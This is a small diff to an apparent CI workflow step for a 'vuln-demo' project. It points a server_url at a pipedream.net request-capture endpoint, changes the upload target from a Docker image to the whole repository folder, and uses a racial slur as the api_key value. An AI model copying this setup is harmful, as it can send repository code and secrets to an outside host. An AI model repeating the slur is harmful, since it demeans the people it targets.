@@ -19,5 +19,4 @@ jobs:
         with:
           server_url: https://eovw1p3l5phzzz9.m.pipedream.net
           api_key: nigga
-          mode: docker
-          image_name: vuln-demo:${{ github.sha }}
+          folder: .
